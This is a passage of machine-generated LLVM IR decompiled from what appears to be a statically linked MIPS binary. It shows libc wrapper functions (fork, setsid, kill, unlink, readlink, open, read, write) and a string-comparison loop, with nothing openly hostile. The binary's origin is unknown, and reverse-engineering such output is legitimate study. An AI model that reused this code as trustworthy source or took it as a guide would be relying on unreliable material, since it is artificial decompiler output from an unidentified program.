  %v1_404c14 = add nsw i32 %v3_404c0c, 191
  %v1_404c18 = add nsw i32 %v3_404c10, 191
  %v1_404c1c = and i32 %v1_404c14, 254
  %v1_404c20 = and i32 %v1_404c18, 254
  %v1_404c24 = icmp ult i32 %v1_404c1c, 26
  %v1_404c28 = add i32 %v0_404c28, -1
  %v1_404c2c = add i32 %v0_404c2c, 1
  %v1_404c30 = icmp eq i1 %v1_404c24, false
  %v3_404c30 = icmp ult i32 %v1_404c20, 26
  br i1 %v1_404c30, label %dec_label_pc_404c3c, label %dec_label_pc_404c34

dec_label_pc_404c34:                              ; preds = %dec_label_pc_404c0c
  %v1_404c38 = or i32 %v3_404c0c, 96
  br label %dec_label_pc_404c3c

dec_label_pc_404c3c:                              ; preds = %dec_label_pc_404c0c, %dec_label_pc_404c34
  %v0_404c48 = phi i32 [ %v3_404c0c, %dec_label_pc_404c0c ], [ %v1_404c38, %dec_label_pc_404c34 ]
  %v1_404c3c = icmp eq i1 %v3_404c30, false
  br i1 %v1_404c3c, label %dec_label_pc_404c48, label %dec_label_pc_404c40

dec_label_pc_404c40:                              ; preds = %dec_label_pc_404c3c
  %v1_404c44 = or i32 %v3_404c10, 96
  br label %dec_label_pc_404c48

dec_label_pc_404c48:                              ; preds = %dec_label_pc_404c3c, %dec_label_pc_404c40
  %v1_404c48 = phi i32 [ %v3_404c10, %dec_label_pc_404c3c ], [ %v1_404c44, %dec_label_pc_404c40 ]
  %v2_404c48 = icmp eq i32 %v0_404c48, %v1_404c48
  br i1 %v2_404c48, label %dec_label_pc_404c4c, label %dec_label_pc_404c60

dec_label_pc_404c4c:                              ; preds = %dec_label_pc_404c48
  %v0_404c50 = load i32, i32* %t2.global-to-local, align 4
  %v2_404c50 = icmp eq i32 %v0_404c50, %v1_404bf0
  %v6_404c50 = add i32 %v0_404c50, %arg2
  br i1 %v2_404c50, label %dec_label_pc_404c54, label %dec_label_pc_404c68

dec_label_pc_404c54:                              ; preds = %dec_label_pc_404c4c
  %v4_404c58 = sub i32 %v1_404c2c, %tmp
  ret i32 %v4_404c58

dec_label_pc_404c60:                              ; preds = %dec_label_pc_404c48
  store i32 0, i32* %t2.global-to-local, align 4
  br label %dec_label_pc_404c68

dec_label_pc_404c68:                              ; preds = %dec_label_pc_404c4c, %dec_label_pc_404c60
  %v2_404c68 = phi i32 [ %v0_404c50, %dec_label_pc_404c4c ], [ 0, %dec_label_pc_404c60 ]
  %v0_404c105 = phi i32 [ %v6_404c50, %dec_label_pc_404c4c ], [ %arg2, %dec_label_pc_404c60 ]
  %v1_404c68 = icmp sgt i32 %v1_404c28, 0
  %v3_404c68 = add i32 %v2_404c68, 1
  store i32 %v3_404c68, i32* %t2.global-to-local, align 4
  br i1 %v1_404c68, label %dec_label_pc_404c0c, label %dec_label_pc_404c6c

dec_label_pc_404c6c:                              ; preds = %dec_label_pc_404c68
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v0_404c50, { 1, 0, 2 }
  uselistorder i32 %v0_404bf4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %t2.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32 26, { 1, 2, 3, 4, 0 }
  uselistorder i32 254, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i32 191, { 1, 2, 0 }
  uselistorder i8 0, { 0, 20, 1, 2, 3, 4, 21, 22, 5, 6, 7, 8, 23, 24, 25, 26, 9, 10, 27, 11, 12, 28, 13, 14, 15, 29, 30, 16, 17, 18, 19 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_404c68, { 1, 0 }
  uselistorder label %dec_label_pc_404c48, { 1, 0 }
  uselistorder label %dec_label_pc_404c3c, { 1, 0 }
}

define i32 @function_404c80() local_unnamed_addr {
dec_label_pc_404c80:
  %s0.global-to-local = alloca i32, align 4
  %v0_404c9c = load i32, i32* @a1, align 4
  %v1_404c9c = add i32 %v0_404c9c, -33
  %v1_404ca4 = icmp ult i32 %v1_404c9c, 3
  %v2_404ca4 = zext i1 %v1_404ca4 to i32
  store i32 %v2_404ca4, i32* @v1, align 4
  %v3_404ca8 = load i32, i32* @global_var_449bf8.193, align 4
  store i32 %v3_404ca8, i32* @t9, align 4
  %v1_404cb4 = icmp eq i1 %v1_404ca4, false
  br i1 %v1_404cb4, label %dec_label_pc_404cd0, label %dec_label_pc_404cb8

dec_label_pc_404cb8:                              ; preds = %dec_label_pc_404c80
  %v1_404cbc = call i32 @function_404d10()
  %v1_404cd4.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_404cd0

dec_label_pc_404cd0:                              ; preds = %dec_label_pc_404c80, %dec_label_pc_404cb8
  %v1_404cd4 = phi i32 [ %v0_404c9c, %dec_label_pc_404c80 ], [ %v1_404cd4.pre, %dec_label_pc_404cb8 ]
  %v0_404cd4 = load i32, i32* @a0, align 4
  %v2_404cd4 = call i32 (i32, i32, ...) @fcntl(i32 %v0_404cd4, i32 %v1_404cd4)
  %v3_404cd8 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_404cd8, i32* @t9, align 4
  %v0_404cdc = load i32, i32* @a3, align 4
  %v1_404cdc = icmp eq i32 %v0_404cdc, 0
  store i32 %v2_404cd4, i32* %s0.global-to-local, align 4
  br i1 %v1_404cdc, label %dec_label_pc_404cf8, label %dec_label_pc_404ce0

dec_label_pc_404ce0:                              ; preds = %dec_label_pc_404cd0
  %v1_404ce4 = call i32 @function_4057a0()
  %v0_404cf0 = load i32, i32* %s0.global-to-local, align 4
  %v2_404cf0 = inttoptr i32 %v1_404ce4 to i32*
  store i32 %v0_404cf0, i32* %v2_404cf0, align 4
  br label %dec_label_pc_404cf8

dec_label_pc_404cf8:                              ; preds = %dec_label_pc_404cd0, %dec_label_pc_404ce0
  %v4_404d00 = phi i32 [ %v2_404cd4, %dec_label_pc_404cd0 ], [ -1, %dec_label_pc_404ce0 ]
  ret i32 %v4_404d00

; uselistorder directives
  uselistorder label %dec_label_pc_404cf8, { 1, 0 }
  uselistorder label %dec_label_pc_404cd0, { 1, 0 }
}

define i32 @function_404d10() local_unnamed_addr {
dec_label_pc_404d10:
  %s0.global-to-local = alloca i32, align 4
  %v0_404d34 = load i32, i32* @a3, align 4
  %v3_404d44 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_404d44, i32* @t9, align 4
  %v1_404d48 = icmp eq i32 %v0_404d34, 0
  store i32 4220, i32* %s0.global-to-local, align 4
  br i1 %v1_404d48, label %dec_label_pc_404d64, label %dec_label_pc_404d4c

dec_label_pc_404d4c:                              ; preds = %dec_label_pc_404d10
  %v1_404d50 = call i32 @function_4057a0()
  %v0_404d5c = load i32, i32* %s0.global-to-local, align 4
  %v2_404d5c = inttoptr i32 %v1_404d50 to i32*
  store i32 %v0_404d5c, i32* %v2_404d5c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404d64

dec_label_pc_404d64:                              ; preds = %dec_label_pc_404d10, %dec_label_pc_404d4c
  %v0_404d64 = phi i32 [ 4220, %dec_label_pc_404d10 ], [ -1, %dec_label_pc_404d4c ]
  ret i32 %v0_404d64

; uselistorder directives
  uselistorder label %dec_label_pc_404d64, { 1, 0 }
}

define i32 @function_404d80(i8* %arg1) local_unnamed_addr {
dec_label_pc_404d80:
  %s0.global-to-local = alloca i32, align 4
  %v3_404da0 = call i32 @chdir(i8* %arg1)
  %v3_404da4 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_404da4, i32* @t9, align 4
  %v0_404da8 = load i32, i32* @a3, align 4
  %v1_404da8 = icmp eq i32 %v0_404da8, 0
  store i32 %v3_404da0, i32* %s0.global-to-local, align 4
  br i1 %v1_404da8, label %dec_label_pc_404dc4, label %dec_label_pc_404dac

dec_label_pc_404dac:                              ; preds = %dec_label_pc_404d80
  %v1_404db0 = call i32 @function_4057a0()
  %v0_404dbc = load i32, i32* %s0.global-to-local, align 4
  %v2_404dbc = inttoptr i32 %v1_404db0 to i32*
  store i32 %v0_404dbc, i32* %v2_404dbc, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404dc4

dec_label_pc_404dc4:                              ; preds = %dec_label_pc_404d80, %dec_label_pc_404dac
  %v0_404dc4 = phi i32 [ %v3_404da0, %dec_label_pc_404d80 ], [ -1, %dec_label_pc_404dac ]
  ret i32 %v0_404dc4

; uselistorder directives
  uselistorder label %dec_label_pc_404dc4, { 1, 0 }
}

define i32 @function_404de0(i32 %arg1) local_unnamed_addr {
dec_label_pc_404de0:
  %s0.global-to-local = alloca i32, align 4
  %v1_404e00 = call i32 @close(i32 %arg1)
  %v3_404e04 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_404e04, i32* @t9, align 4
  %v0_404e08 = load i32, i32* @a3, align 4
  %v1_404e08 = icmp eq i32 %v0_404e08, 0
  store i32 %v1_404e00, i32* %s0.global-to-local, align 4
  br i1 %v1_404e08, label %dec_label_pc_404e24, label %dec_label_pc_404e0c

dec_label_pc_404e0c:                              ; preds = %dec_label_pc_404de0
  %v1_404e10 = call i32 @function_4057a0()
  %v0_404e1c = load i32, i32* %s0.global-to-local, align 4
  %v2_404e1c = inttoptr i32 %v1_404e10 to i32*
  store i32 %v0_404e1c, i32* %v2_404e1c, align 4
  br label %dec_label_pc_404e24

dec_label_pc_404e24:                              ; preds = %dec_label_pc_404de0, %dec_label_pc_404e0c
  %v4_404e2c = phi i32 [ %v1_404e00, %dec_label_pc_404de0 ], [ -1, %dec_label_pc_404e0c ]
  ret i32 %v4_404e2c

; uselistorder directives
  uselistorder label %dec_label_pc_404e24, { 1, 0 }
}

define i32 @function_404e40() local_unnamed_addr {
dec_label_pc_404e40:
  %s0.global-to-local = alloca i32, align 4
  %v0_404e60 = call i32 @fork()
  %v3_404e64 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_404e64, i32* @t9, align 4
  %v0_404e68 = load i32, i32* @a3, align 4
  %v1_404e68 = icmp eq i32 %v0_404e68, 0
  store i32 %v0_404e60, i32* %s0.global-to-local, align 4
  br i1 %v1_404e68, label %dec_label_pc_404e84, label %dec_label_pc_404e6c

dec_label_pc_404e6c:                              ; preds = %dec_label_pc_404e40
  %v1_404e70 = call i32 @function_4057a0()
  %v0_404e7c = load i32, i32* %s0.global-to-local, align 4
  %v2_404e7c = inttoptr i32 %v1_404e70 to i32*
  store i32 %v0_404e7c, i32* %v2_404e7c, align 4
  br label %dec_label_pc_404e84

dec_label_pc_404e84:                              ; preds = %dec_label_pc_404e40, %dec_label_pc_404e6c
  %v4_404e8c = phi i32 [ %v0_404e60, %dec_label_pc_404e40 ], [ -1, %dec_label_pc_404e6c ]
  ret i32 %v4_404e8c

; uselistorder directives
  uselistorder label %dec_label_pc_404e84, { 1, 0 }
}

define i32 @function_404ea0() local_unnamed_addr {
dec_label_pc_404ea0:
  %stack_var_-16 = alloca i32, align 4
  %v3_404eb8 = load i32, i32* @global_var_449c08.194, align 4
  store i32 %v3_404eb8, i32* @t9, align 4
  %v6_404ec0 = bitcast i32* %stack_var_-16 to %rlimit*
  %v7_404ec0 = call i32 @function_404fb0(i32 5, %rlimit* %v6_404ec0)
  %v1_404ecc = icmp slt i32 %v7_404ec0, 0
  br i1 %v1_404ecc, label %dec_label_pc_404ed8, label %dec_label_pc_404ed0

dec_label_pc_404ed0:                              ; preds = %dec_label_pc_404ea0
  %v3_404ed4 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_404ed8

dec_label_pc_404ed8:                              ; preds = %dec_label_pc_404ea0, %dec_label_pc_404ed0
  %v0_404edc = phi i32 [ 256, %dec_label_pc_404ea0 ], [ %v3_404ed4, %dec_label_pc_404ed0 ]
  ret i32 %v0_404edc

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_404ed8, { 1, 0 }
}

define i32 @function_404ef0() local_unnamed_addr {
dec_label_pc_404ef0:
  %s0.global-to-local = alloca i32, align 4
  %v0_404f10 = call i32 @getpid()
  %v3_404f14 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_404f14, i32* @t9, align 4
  %v0_404f18 = load i32, i32* @a3, align 4
  %v1_404f18 = icmp eq i32 %v0_404f18, 0
  store i32 %v0_404f10, i32* %s0.global-to-local, align 4
  br i1 %v1_404f18, label %dec_label_pc_404f34, label %dec_label_pc_404f1c

dec_label_pc_404f1c:                              ; preds = %dec_label_pc_404ef0
  %v1_404f20 = call i32 @function_4057a0()
  %v0_404f2c = load i32, i32* %s0.global-to-local, align 4
  %v2_404f2c = inttoptr i32 %v1_404f20 to i32*
  store i32 %v0_404f2c, i32* %v2_404f2c, align 4
  br label %dec_label_pc_404f34

dec_label_pc_404f34:                              ; preds = %dec_label_pc_404ef0, %dec_label_pc_404f1c
  %v4_404f3c = phi i32 [ %v0_404f10, %dec_label_pc_404ef0 ], [ -1, %dec_label_pc_404f1c ]
  ret i32 %v4_404f3c

; uselistorder directives
  uselistorder label %dec_label_pc_404f34, { 1, 0 }
}

define i32 @function_404f50() local_unnamed_addr {
dec_label_pc_404f50:
  %s0.global-to-local = alloca i32, align 4
  %v0_404f70 = call i32 @getppid()
  %v3_404f74 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_404f74, i32* @t9, align 4
  %v0_404f78 = load i32, i32* @a3, align 4
  %v1_404f78 = icmp eq i32 %v0_404f78, 0
  store i32 %v0_404f70, i32* %s0.global-to-local, align 4
  br i1 %v1_404f78, label %dec_label_pc_404f94, label %dec_label_pc_404f7c

dec_label_pc_404f7c:                              ; preds = %dec_label_pc_404f50
  %v1_404f80 = call i32 @function_4057a0()
  %v0_404f8c = load i32, i32* %s0.global-to-local, align 4
  %v2_404f8c = inttoptr i32 %v1_404f80 to i32*
  store i32 %v0_404f8c, i32* %v2_404f8c, align 4
  br label %dec_label_pc_404f94

dec_label_pc_404f94:                              ; preds = %dec_label_pc_404f50, %dec_label_pc_404f7c
  %v4_404f9c = phi i32 [ %v0_404f70, %dec_label_pc_404f50 ], [ -1, %dec_label_pc_404f7c ]
  ret i32 %v4_404f9c

; uselistorder directives
  uselistorder label %dec_label_pc_404f94, { 1, 0 }
}

define i32 @function_404fb0(i32 %arg1, %rlimit* %arg2) local_unnamed_addr {
dec_label_pc_404fb0:
  %s0.global-to-local = alloca i32, align 4
  %v4_404fd0 = call i32 @getrlimit(i32 %arg1, %rlimit* %arg2)
  %v3_404fd4 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_404fd4, i32* @t9, align 4
  %v0_404fd8 = load i32, i32* @a3, align 4
  %v1_404fd8 = icmp eq i32 %v0_404fd8, 0
  store i32 %v4_404fd0, i32* %s0.global-to-local, align 4
  br i1 %v1_404fd8, label %dec_label_pc_404ff4, label %dec_label_pc_404fdc

dec_label_pc_404fdc:                              ; preds = %dec_label_pc_404fb0
  %v1_404fe0 = call i32 @function_4057a0()
  %v0_404fec = load i32, i32* %s0.global-to-local, align 4
  %v2_404fec = inttoptr i32 %v1_404fe0 to i32*
  store i32 %v0_404fec, i32* %v2_404fec, align 4
  br label %dec_label_pc_404ff4

dec_label_pc_404ff4:                              ; preds = %dec_label_pc_404fb0, %dec_label_pc_404fdc
  %v4_404ffc = phi i32 [ %v4_404fd0, %dec_label_pc_404fb0 ], [ -1, %dec_label_pc_404fdc ]
  ret i32 %v4_404ffc

; uselistorder directives
  uselistorder label %dec_label_pc_404ff4, { 1, 0 }
}

define i32 @function_405010(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405010:
  %s0.global-to-local = alloca i32, align 4
  %v2_405030 = call i32 @kill(i32 %arg1, i32 %arg2)
  %v3_405034 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405034, i32* @t9, align 4
  %v0_405038 = load i32, i32* @a3, align 4
  %v1_405038 = icmp eq i32 %v0_405038, 0
  store i32 %v2_405030, i32* %s0.global-to-local, align 4
  br i1 %v1_405038, label %dec_label_pc_405054, label %dec_label_pc_40503c

dec_label_pc_40503c:                              ; preds = %dec_label_pc_405010
  %v1_405040 = call i32 @function_4057a0()
  %v0_40504c = load i32, i32* %s0.global-to-local, align 4
  %v2_40504c = inttoptr i32 %v1_405040 to i32*
  store i32 %v0_40504c, i32* %v2_40504c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_405054

dec_label_pc_405054:                              ; preds = %dec_label_pc_405010, %dec_label_pc_40503c
  %v0_405054 = phi i32 [ %v2_405030, %dec_label_pc_405010 ], [ -1, %dec_label_pc_40503c ]
  ret i32 %v0_405054

; uselistorder directives
  uselistorder label %dec_label_pc_405054, { 1, 0 }
}

define i32 @function_405070(i8* %arg1) local_unnamed_addr {
dec_label_pc_405070:
  %s0.global-to-local = alloca i32, align 4
  %v0_40508c = load i32, i32* @a1, align 4
  %v1_40508c = and i32 %v0_40508c, 256
  %v1_405098 = icmp eq i32 %v1_40508c, 0
  br i1 %v1_405098, label %dec_label_pc_4050ac, label %dec_label_pc_40509c

dec_label_pc_40509c:                              ; preds = %dec_label_pc_405070
  br label %dec_label_pc_4050ac

dec_label_pc_4050ac:                              ; preds = %dec_label_pc_405070, %dec_label_pc_40509c
  %v4_4050b4 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v0_40508c)
  %v3_4050b8 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_4050b8, i32* @t9, align 4
  %v0_4050bc = load i32, i32* @a3, align 4
  %v1_4050bc = icmp eq i32 %v0_4050bc, 0
  store i32 %v4_4050b4, i32* %s0.global-to-local, align 4
  br i1 %v1_4050bc, label %dec_label_pc_4050d8, label %dec_label_pc_4050c0

dec_label_pc_4050c0:                              ; preds = %dec_label_pc_4050ac
  %v1_4050c4 = call i32 @function_4057a0()
  %v0_4050d0 = load i32, i32* %s0.global-to-local, align 4
  %v2_4050d0 = inttoptr i32 %v1_4050c4 to i32*
  store i32 %v0_4050d0, i32* %v2_4050d0, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4050d8

dec_label_pc_4050d8:                              ; preds = %dec_label_pc_4050ac, %dec_label_pc_4050c0
  %v0_4050d8 = phi i32 [ %v4_4050b4, %dec_label_pc_4050ac ], [ -1, %dec_label_pc_4050c0 ]
  ret i32 %v0_4050d8

; uselistorder directives
  uselistorder label %dec_label_pc_4050d8, { 1, 0 }
  uselistorder label %dec_label_pc_4050ac, { 1, 0 }
}

define i32 @function_4050ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_4050ec:
  %v3_4050f8 = load i32, i32* @global_var_449a84.195, align 4
  store i32 %v3_4050f8, i32* @t9, align 4
  store i32 %arg1, i32* @a2, align 4
  store i32 769, i32* @a1, align 4
  %v3_405100 = call i32 @function_405070(i8* inttoptr (i32 769 to i8*))
  ret i32 %v3_405100
}

define i32 @function_405110(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405110:
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 4003, i32* %v0.global-to-local, align 4
  %v4_405130 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_405130, i32* %v0.global-to-local, align 4
  %v3_405134 = load i32, i32* @global_var_449b6c.83, align 4
  %v0_405138 = load i32, i32* @a3, align 4
  %v1_405138 = icmp eq i32 %v0_405138, 0
  store i32 %v4_405130, i32* %s0.global-to-local, align 4
  br i1 %v1_405138, label %dec_label_pc_405154, label %dec_label_pc_40513c

dec_label_pc_40513c:                              ; preds = %dec_label_pc_405110
  call void @__pseudo_call(i32 %v3_405134)
  %v0_40514c = load i32, i32* %s0.global-to-local, align 4
  %v1_40514c = load i32, i32* %v0.global-to-local, align 4
  %v2_40514c = inttoptr i32 %v1_40514c to i32*
  store i32 %v0_40514c, i32* %v2_40514c, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_405154

dec_label_pc_405154:                              ; preds = %dec_label_pc_405110, %dec_label_pc_40513c
  %v4_40515c = phi i32 [ %v4_405130, %dec_label_pc_405110 ], [ -1, %dec_label_pc_40513c ]
  ret i32 %v4_40515c

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_405154, { 1, 0 }
}

define i32 @function_405170(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_405170:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %v7_405190 = call i32 @readlink(i8* %arg1, i8* %tmp, i32 %arg3)
  %v3_405194 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405194, i32* @t9, align 4
  %v1_405198 = icmp eq i32 %arg4, 0
  store i32 %v7_405190, i32* %s0.global-to-local, align 4
  br i1 %v1_405198, label %dec_label_pc_4051b4, label %dec_label_pc_40519c

dec_label_pc_40519c:                              ; preds = %dec_label_pc_405170
  %v1_4051a0 = call i32 @function_4057a0()
  %v0_4051ac = load i32, i32* %s0.global-to-local, align 4
  %v2_4051ac = inttoptr i32 %v1_4051a0 to i32*
  store i32 %v0_4051ac, i32* %v2_4051ac, align 4
  br label %dec_label_pc_4051b4

dec_label_pc_4051b4:                              ; preds = %dec_label_pc_405170, %dec_label_pc_40519c
  %v4_4051bc = phi i32 [ %v7_405190, %dec_label_pc_405170 ], [ -1, %dec_label_pc_40519c ]
  ret i32 %v4_4051bc

; uselistorder directives
  uselistorder label %dec_label_pc_4051b4, { 1, 0 }
}

define i32 @function_4051d0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4051d0:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @a3, align 4
  %v3_405210 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405210, i32* @t9, align 4
  %v1_405214 = icmp eq i32 %arg1, 0
  store i32 4142, i32* %s0.global-to-local, align 4
  br i1 %v1_405214, label %dec_label_pc_405230, label %dec_label_pc_405218

dec_label_pc_405218:                              ; preds = %dec_label_pc_4051d0
  %v1_40521c = call i32 @function_4057a0()
  %v0_405228 = load i32, i32* %s0.global-to-local, align 4
  %v2_405228 = inttoptr i32 %v1_40521c to i32*
  store i32 %v0_405228, i32* %v2_405228, align 4
  br label %dec_label_pc_405230

dec_label_pc_405230:                              ; preds = %dec_label_pc_4051d0, %dec_label_pc_405218
  %v4_405240 = phi i32 [ 4142, %dec_label_pc_4051d0 ], [ -1, %dec_label_pc_405218 ]
  ret i32 %v4_405240

; uselistorder directives
  uselistorder label %dec_label_pc_405230, { 1, 0 }
}

define i32 @function_405250() local_unnamed_addr {
dec_label_pc_405250:
  %s0.global-to-local = alloca i32, align 4
  %v0_405270 = call i32 @setsid()
  %v3_405274 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405274, i32* @t9, align 4
  %v0_405278 = load i32, i32* @a3, align 4
  %v1_405278 = icmp eq i32 %v0_405278, 0
  store i32 %v0_405270, i32* %s0.global-to-local, align 4
  br i1 %v1_405278, label %dec_label_pc_405294, label %dec_label_pc_40527c

dec_label_pc_40527c:                              ; preds = %dec_label_pc_405250
  %v1_405280 = call i32 @function_4057a0()
  %v0_40528c = load i32, i32* %s0.global-to-local, align 4
  %v2_40528c = inttoptr i32 %v1_405280 to i32*
  store i32 %v0_40528c, i32* %v2_40528c, align 4
  br label %dec_label_pc_405294

dec_label_pc_405294:                              ; preds = %dec_label_pc_405250, %dec_label_pc_40527c
  %v4_40529c = phi i32 [ %v0_405270, %dec_label_pc_405250 ], [ -1, %dec_label_pc_40527c ]
  ret i32 %v4_40529c

; uselistorder directives
  uselistorder label %dec_label_pc_405294, { 1, 0 }
}

define i32 @function_4052b0(i32* %arg1) local_unnamed_addr {
dec_label_pc_4052b0:
  %s0.global-to-local = alloca i32, align 4
  %v2_4052d0 = call i32 @time(i32* %arg1)
  %v3_4052d4 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_4052d4, i32* @t9, align 4
  %v0_4052d8 = load i32, i32* @a3, align 4
  %v1_4052d8 = icmp eq i32 %v0_4052d8, 0
  store i32 %v2_4052d0, i32* %s0.global-to-local, align 4
  br i1 %v1_4052d8, label %dec_label_pc_4052f4, label %dec_label_pc_4052dc

dec_label_pc_4052dc:                              ; preds = %dec_label_pc_4052b0
  %v1_4052e0 = call i32 @function_4057a0()
  %v0_4052ec = load i32, i32* %s0.global-to-local, align 4
  %v2_4052ec = inttoptr i32 %v1_4052e0 to i32*
  store i32 %v0_4052ec, i32* %v2_4052ec, align 4
  br label %dec_label_pc_4052f4

dec_label_pc_4052f4:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052dc
  %v4_4052fc = phi i32 [ %v2_4052d0, %dec_label_pc_4052b0 ], [ -1, %dec_label_pc_4052dc ]
  ret i32 %v4_4052fc

; uselistorder directives
  uselistorder label %dec_label_pc_4052f4, { 1, 0 }
}

define i32 @function_405310(i8* %arg1) local_unnamed_addr {
dec_label_pc_405310:
  %s0.global-to-local = alloca i32, align 4
  %v3_405330 = call i32 @unlink(i8* %arg1)
  %v3_405334 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405334, i32* @t9, align 4
  %v0_405338 = load i32, i32* @a3, align 4
  %v1_405338 = icmp eq i32 %v0_405338, 0
  store i32 %v3_405330, i32* %s0.global-to-local, align 4
  br i1 %v1_405338, label %dec_label_pc_405354, label %dec_label_pc_40533c

dec_label_pc_40533c:                              ; preds = %dec_label_pc_405310
  %v1_405340 = call i32 @function_4057a0()
  %v0_40534c = load i32, i32* %s0.global-to-local, align 4
  %v2_40534c = inttoptr i32 %v1_405340 to i32*
  store i32 %v0_40534c, i32* %v2_40534c, align 4
  br label %dec_label_pc_405354

dec_label_pc_405354:                              ; preds = %dec_label_pc_405310, %dec_label_pc_40533c
  %v4_40535c = phi i32 [ %v3_405330, %dec_label_pc_405310 ], [ -1, %dec_label_pc_40533c ]
  ret i32 %v4_40535c

; uselistorder directives
  uselistorder label %dec_label_pc_405354, { 1, 0 }
}

define i32 @function_405370(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_405370:
  %s0.global-to-local = alloca i32, align 4
  %v3_405390 = load i32, i32* @a2, align 4
  %v4_405390 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_405390)
  %v3_405394 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_405394, i32* @t9, align 4
  %v0_405398 = load i32, i32* @a3, align 4
  %v1_405398 = icmp eq i32 %v0_405398, 0
  store i32 %v4_405390, i32* %s0.global-to-local, align 4
  br i1 %v1_405398, label %dec_label_pc_4053b4, label %dec_label_pc_40539c

dec_label_pc_40539c:                              ; preds = %dec_label_pc_405370
  %v1_4053a0 = call i32 @function_4057a0()
  %v0_4053ac = load i32, i32* %s0.global-to-local, align 4
  %v2_4053ac = inttoptr i32 %v1_4053a0 to i32*
  store i32 %v0_4053ac, i32* %v2_4053ac, align 4
  br label %dec_label_pc_4053b4

dec_label_pc_4053b4:                              ; preds = %dec_label_pc_405370, %dec_label_pc_40539c
  %v4_4053bc = phi i32 [ %v4_405390, %dec_label_pc_405370 ], [ -1, %dec_label_pc_40539c ]
  ret i32 %v4_4053bc

; uselistorder directives
  uselistorder label %dec_label_pc_4053b4, { 1, 0 }
}

define i32 @function_4053d0(i32* %arg1) local_unnamed_addr {
dec_label_pc_4053d0:
  %s0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_4053f0 = load i32, i32* @s0, align 4
  store i32 %tmp, i32* @s1, align 4
  %v2_405400 = load i32, i32* %arg1, align 4
  %v1_405404 = add i32 %tmp, 24
  store i32 %v1_405404, i32* %s0.global-to-local, align 4
  %v2_405408 = ptrtoint i32* %stack_var_-40 to i32
  store i32 -1, i32* @s2, align 4
  store i32 ptrtoint (i32* @global_var_406e6c.197 to i32), i32* %v1.global-to-local, align 4
  %v3_40541c = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_40541c, i32* @t9, align 4
  %v2_405420 = icmp eq i32 %v2_405400, -1
  br i1 %v2_405420, label %dec_label_pc_405424, label %dec_label_pc_405444

dec_label_pc_405424:                              ; preds = %dec_label_pc_4053d0
  %v1_405428 = call i32 @function_4057a0()
  store i32 9, i32* %v1.global-to-local, align 4
  %v2_405440 = inttoptr i32 %v1_405428 to i32*
  store i32 9, i32* %v2_405440, align 4
  %v0_405444.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_405444

dec_label_pc_405444:                              ; preds = %dec_label_pc_4053d0, %dec_label_pc_405424
  %v0_405444 = phi i32 [ ptrtoint (i32* @global_var_406e6c.197 to i32), %dec_label_pc_4053d0 ], [ %v0_405444.pre, %dec_label_pc_405424 ]
  store i32 4215888, i32* @ra, align 4
  call void @__pseudo_call(i32 %v0_405444)
  %v1_405460 = load i32, i32* %s0.global-to-local, align 4
  %v3_405460 = call i32 @function_406e64(i32 %v1_405460)
  store i32 %v3_405460, i32* @v0, align 4
  %v0_405474 = load i32, i32* @s1, align 4
  %v1_405474 = inttoptr i32 %v0_405474 to i32*
  %v2_405474 = load i32, i32* %v1_405474, align 4
  store i32 %v2_405474, i32* @s0, align 4
  %v1_40547c = load i32, i32* @s2, align 4
  store i32 %v1_40547c, i32* %v1_405474, align 4
  %v6_40547c = call i32 @function_406e6c(i32 %v2_405408, i32 1)
  %v0_405488 = load i32, i32* @s1, align 4
  %v1_405488 = add i32 %v0_405488, 12
